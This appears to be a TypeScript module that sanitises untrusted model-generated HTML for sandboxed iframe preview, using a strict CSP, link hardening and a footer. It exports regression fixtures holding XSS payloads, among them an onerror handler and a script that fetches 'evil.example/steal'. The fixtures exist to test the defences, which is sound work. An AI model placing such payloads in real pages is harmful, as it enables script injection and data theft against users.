import { previewCopy } from '../copy/surfaces';

/** Strict iframe sandbox — no scripts, same-origin, navigation, or popups. */
export const PREVIEW_IFRAME_SANDBOX = '' as const;

/** CSP injected into wrapped HTML — blocks network, scripts, and top navigation. */
export const PREVIEW_HTML_CSP =
  "default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; base-uri 'none'; form-action 'none'; navigate-to 'none';";

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_HTML_CSP}">`;

const FOOTER_HTML = `<footer class="otto-preview-sandbox-footer" aria-hidden="true">${previewCopy.sandboxFooter}</footer>`;

const WRAPPER_STYLES = `<style>
  html, body { margin: 0; padding: 0; }
  body { font: 13px/1.45 system-ui, sans-serif; color: #e8e8e8; background: #1a1a1a; }
  .otto-preview-sandbox-footer {
    position: sticky; bottom: 0; margin-top: 1rem; padding: 6px 10px;
    border-top: 1px solid #333; font: 11px/1.3 system-ui, sans-serif;
    color: #888; background: #141414; text-align: center;
  }
</style>`;

/** Regression fixtures — malicious patterns model HTML may contain. */
export const MALICIOUS_PREVIEW_FIXTURES = {
  scriptTag: '<script>window.__ottoPwned=true</script><p>Hi</p>',
  onerrorHandler: '<img src="x" onerror="window.__ottoPwned=true">',
  windowOpen: '<a href="https://evil.example" onclick="window.open(this.href);return false">click</a>',
  externalFetch: '<script>fetch("https://evil.example/steal")</script>',
} as const;

function hardenLinks(html: string): string {
  return html.replace(/<a\b([^>]*)>/gi, (_match, attrs: string) => {
    let next = attrs;
    if (!/\btarget\s*=/.test(next)) next += ' target="_blank"';
    if (!/\brel\s*=/.test(next)) next += ' rel="noopener noreferrer"';
    return `<a${next}>`;
  });
}

function injectIntoDocument(html: string, injection: string): string {
  if (/<head[\s>]/i.test(html)) {
    return html.replace(/<head(\s[^>]*)?>/i, (head) => `${head}\n${injection}`);
  }
  if (/<html[\s>]/i.test(html)) {
    return html.replace(/<html(\s[^>]*)?>/i, (tag) => `${tag}\n<head>${injection}</head>`);
  }
  return `<!DOCTYPE html><html><head>${injection}</head><body>${html}</body></html>`;
}

/** Wrap untrusted model HTML for sandboxed iframe srcDoc rendering. */
export function wrapHtmlForSandboxPreview(html: string): string {
  const hardened = hardenLinks(html.trim());
  const withShell = injectIntoDocument(hardened, `${CSP_META}\n${WRAPPER_STYLES}`);
  if (/<\/body>/i.test(withShell)) {
    return withShell.replace(/<\/body>/i, `${FOOTER_HTML}\n</body>`);
  }
  return `${withShell}${FOOTER_HTML}`;
}
